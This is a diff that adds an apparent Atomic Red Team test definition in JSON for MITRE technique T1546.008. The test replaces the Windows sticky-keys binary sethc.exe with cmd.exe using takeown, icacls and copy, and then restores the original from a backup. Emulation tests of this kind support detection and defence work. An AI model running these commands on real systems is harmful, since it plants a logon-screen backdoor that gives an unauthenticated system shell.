@@ -1,0 +1,44 @@
+{
+  "id": "934e90cf-29ca-48b3-863c-411737ad44e3",
+  "name": "Replace binary of sticky keys",
+  "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "f528a9e9-df8a-4076-9091-431497140590",
+      "type": "execute-command",
+      "data": {
+        "command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a8d885ad-38fd-40aa-b91f-69caf1586683",
+      "type": "execute-command",
+      "data": {
+        "command": "copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "f528a9e9-df8a-4076-9091-431497140590",
+      "p": "on-success",
+      "o": "a8d885ad-38fd-40aa-b91f-69caf1586683"
+    },
+    {
+      "s": "f528a9e9-df8a-4076-9091-431497140590",
+      "p": "on-failure",
+      "o": "a8d885ad-38fd-40aa-b91f-69caf1586683"
+    }
+  ],
+  "tags": [
+    "T1546.008",
+    "atomic-red-team"
+  ]
+}
